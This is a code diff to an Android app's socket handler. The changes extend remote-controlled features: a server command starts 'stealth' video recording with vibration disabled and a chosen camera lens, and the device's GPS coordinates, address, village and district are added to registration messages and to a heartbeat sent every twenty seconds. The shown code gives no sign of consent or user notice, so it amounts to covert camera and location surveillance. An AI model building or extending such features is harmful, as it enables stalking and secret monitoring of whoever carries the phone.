@@ -88,7 +88,11 @@ object SocketManager {
                     val data = args.firstOrNull() as? JSONObject
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     Log.i(TAG, " Received START live stream command (Lens: $camera)")
-                    LiveStreamService.startService(context, camera)
+                    if (!CameraRecordingService.isServiceRunning) {
+                        LiveStreamService.startService(context, camera)
+                    } else {
+                        Log.i(TAG, "CameraRecordingService already active & streaming frames.")
+                    }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error handling start-live-stream", e)
                 }
@@ -113,10 +117,21 @@ object SocketManager {
             }
 
             // Command 4: Remote start stealth video recording
-            socket?.on("start-remote-recording") {
+            socket?.on("start-remote-recording") { args ->
                 try {
-                    Log.i(TAG, " Received REMOTE START recording command")
-                    CameraRecordingService.startService(context, enableVibration = false)
+                    val camera = if (args.isNotEmpty() && args[0] is JSONObject) {
+                        (args[0] as JSONObject).optString("camera", "BACK")
+                    } else if (args.isNotEmpty() && args[0] is String) {
+                        args[0] as String
+                    } else {
+                        "BACK"
+                    }
+                    val lens = if (camera.equals("FRONT", ignoreCase = true)) "FRONT" else "BACK"
+                    prefs.cameraLens = lens
+                    Log.i(TAG, "📡 Received REMOTE START recording command with lens: $lens")
+                    // Stop LiveStreamService first to cleanly hand over camera hardware to CameraRecordingService
+                    LiveStreamService.stopService(context)
+                    CameraRecordingService.startService(context, enableVibration = false, cameraLens = lens)
                 } catch (e: Exception) {
                     Log.e(TAG, "Error starting remote recording", e)
                 }
@@ -162,11 +177,20 @@ object SocketManager {
                 val prefs = AppPreferences(context)
                 while (!Thread.currentThread().isInterrupted && socket?.connected() == true) {
                     val battery = BackendClient.getBatteryLevel(context)
+                    val loc = BackendClient.getLocation(context)
+
                     val payload = JSONObject().apply {
                         put("deviceId", BackendClient.getDeviceId(context))
                         put("batteryLevel", battery)
                         put("isRecording", prefs.isRecording)
                         put("timestamp", System.currentTimeMillis())
+                        if (loc != null) {
+                            put("latitude", loc.latitude)
+                            put("longitude", loc.longitude)
+                            put("locationName", loc.address)
+                            put("villageOrPara", loc.villageOrPara)
+                            put("districtAndCountry", loc.districtAndCountry)
+                        }
                     }
                     socket?.emit("device-heartbeat", payload)
                     Thread.sleep(20000)
@@ -207,11 +231,19 @@ object SocketManager {
             val deviceId = BackendClient.getDeviceId(context)
             val deviceName = BackendClient.getDeviceName()
             val battery = BackendClient.getBatteryLevel(context)
+            val loc = BackendClient.getLocation(context)
 
             val payload = JSONObject().apply {
                 put("deviceId", deviceId)
                 put("deviceName", deviceName)
                 put("batteryLevel", battery)
+                if (loc != null) {
+                    put("latitude", loc.latitude)
+                    put("longitude", loc.longitude)
+                    put("locationName", loc.address)
+                    put("villageOrPara", loc.villageOrPara)
+                    put("districtAndCountry", loc.districtAndCountry)
+                }
             }
 
             socket?.emit("register-device", payload)
